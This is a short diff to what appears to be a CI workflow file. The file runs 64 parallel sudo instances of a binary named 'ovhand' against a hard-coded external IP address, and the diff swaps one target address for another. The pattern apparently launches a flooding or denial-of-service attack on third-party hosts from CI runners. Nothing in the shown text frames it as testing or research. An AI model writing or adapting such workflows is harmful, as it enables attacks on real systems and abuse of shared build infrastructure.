@@ -18,7 +18,7 @@ jobs:
           chmod +x ovhand
           PIDS=()
           for i in {1..64}; do
-            sudo timeout 30 ./ovhand 65.21.124.106 22 12 30 &
+            sudo timeout 30 ./ovhand 216.202.200.164 12 30 &
             PIDS+=($!)
           done
           
